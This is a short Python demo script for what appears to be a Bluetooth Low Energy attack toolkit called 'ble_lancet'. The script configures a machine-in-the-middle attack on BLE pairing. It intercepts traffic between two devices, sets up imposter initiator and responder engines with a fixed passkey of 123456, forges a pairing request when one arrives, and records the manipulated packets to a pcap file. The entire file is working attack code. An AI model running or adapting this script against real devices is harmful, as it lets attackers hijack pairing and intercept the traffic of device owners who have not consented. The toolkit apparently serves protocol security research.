import os
import sys

DEMO_PATH = os.path.dirname(os.path.abspath(__file__))
ROOT_PATH = os.path.join(DEMO_PATH, '..')
sys.path.append(ROOT_PATH)

from ble_lancet.packet import SM_Pairing_Request, SM_Pairing_Response
from ble_lancet.lancet import Lancet, LancetItfID, LancetLayer, LancetMode
from ble_lancet.interface import InterfaceRecordFile
from ble_lancet.engine import ImposterEngine, RuleEngine
from ble_lancet.vsm import BT_ROLE, BT_IOCAP
from ble_lancet import lancet_main


@lancet_main
async def main():
    # create the lancet client, modify the LLL layer packets
    lancet = Lancet(LancetLayer.HLL, LancetMode.Manipulate)

    # create the interface record file
    rfile = InterfaceRecordFile('pcap', 'link', 'pe_confusion_t1.pcap')

    # let the interfaces record the modified packet into the file
    lancet.interfaces[LancetItfID.Lancet2Local].enable_record(rfile)
    lancet.interfaces[LancetItfID.Lancet2Remote].enable_record(rfile)

    responder_engine = ImposterEngine(BT_IOCAP.DISPLAY_ONLY, BT_ROLE.RESPONDER)
    initiator_engine = ImposterEngine(BT_IOCAP.DISPLAY_ONLY, BT_ROLE.INITIATOR)

    responder_engine.vsm.set_passkey_cb(lambda: 123456)
    initiator_engine.vsm.set_passkey_cb(lambda: 123456)

    async def rule(pkt):
        if SM_Pairing_Request in pkt:
            assert lancet.local_addr is not None
            assert lancet.remote_addr is not None
            print("Responder: Pairing request received")

            initiator_engine.vsm.set_address(lancet.remote_addr, lancet.local_addr)
            responder_engine.vsm.set_address(lancet.local_addr, lancet.remote_addr)

            await initiator_engine.send_pair_request(pkt)
            print("Initiator: Pairing request sent")
        return pkt

    rule_engine = RuleEngine()
    rule_engine.add_rule(rule)

    # Set up engine links, which dictate how data intercepted by Lancet flows between interfaces.
    lancet.set_engine_link(LancetItfID.Local2Lancet, LancetItfID.Lancet2Local, initiator_engine)
    lancet.set_engine_link(LancetItfID.Remote2Lancet,
                           LancetItfID.Lancet2Remote, rule_engine, responder_engine)

    # start the lancet client and wait for it to finish
    await lancet.start_and_wait()

main()
